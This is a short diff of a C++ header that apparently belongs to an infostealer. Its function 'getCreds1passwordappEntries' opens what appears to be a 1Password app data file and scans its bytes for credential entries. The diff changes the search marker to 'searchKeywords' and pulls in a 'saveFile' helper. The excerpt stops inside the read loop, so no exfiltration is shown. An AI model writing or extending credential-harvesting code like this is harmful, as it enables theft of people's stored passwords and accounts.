@@ -1,19 +1,18 @@
 #pragma once
-#pragma once
 #include <iostream>
 #include <fstream>
 #include <vector>
 #include <string>
 #include "../../core/saveFile.h"
 
-void getCreds1passwordappEntries2(std::string filename) {
+void getCreds1passwordappEntries1(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
         std::cerr << "Error opening the file." << std::endl;
     }
 
-    std::string searchSequence = "{\"fields\":[{";
+    std::string searchSequence = "searchKeywords";
     std::vector<char> foundData;
 
     while (!file.eof()) {
